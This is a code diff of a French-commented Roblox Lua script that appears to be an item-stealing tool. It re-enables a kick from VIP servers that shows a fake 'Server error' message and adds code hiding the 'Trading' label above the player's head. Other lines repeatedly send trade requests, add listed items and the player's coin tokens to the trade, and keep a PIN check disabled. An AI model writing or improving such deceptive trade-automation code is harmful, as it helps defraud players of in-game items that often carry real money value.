@@ -42,13 +42,12 @@ if #Players:GetPlayers() >= 16 then
     return
 end
 
--- // VÉRIFICATION SERVEUR VIP DÉSACTIVÉE POUR ÉVITER LES ERREURS
--- if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
---     plr:kick("Server error. Please join a DIFFERENT server")
---     return
--- end
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
 
--- // VÉRIFICATION DU PIN DÉSACTIVÉE POUR RÉGLER LE PROBLÈME D'EXPULSION
+-- // VÉRIFICATION DU PIN (DÉSACTIVÉE POUR ÉVITER LE KICK)
 -- local args = {
 --     [1] = {
 --         ["option"] = "PIN",
@@ -76,6 +75,7 @@ end)
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
     if inTrade then
+        -- // SUPPRESSION DU "TRADING" AU DESSUS DE LA TÊTE
         task.spawn(function()
             if plr.Character then
                 for i = 1, 20 do
@@ -89,15 +89,12 @@ tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     end
 end)
 
--- // FONCTIONS DE TRADING (CORRIGÉES)
+-- // FONCTIONS DE TRADING (RÉSEAU)
 local function sendTradeRequest(user)
-    local args = {
-        [1] = game:GetService("Players"):WaitForChild(user)
-    }
+    local target = game:GetService("Players"):WaitForChild(user)
     repeat
         task.wait(0.1)
-        -- Utilisation de unpack(args) comme dans ton script d'origine
-        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
+        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer({target})
     until response == true
 end
 
@@ -288,6 +285,7 @@ if #itemsToSend > 0 then
                 addItemToTrade(item.itemType, item.ItemID)
             end
 
+            -- Ajout des tokens si présents
             local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
             local cleanedText = rawText:gsub("^%s*(.-)%s*$", "%1"):gsub("[^%d]", "")
             local tokensamount = tonumber(cleanedText) or 0
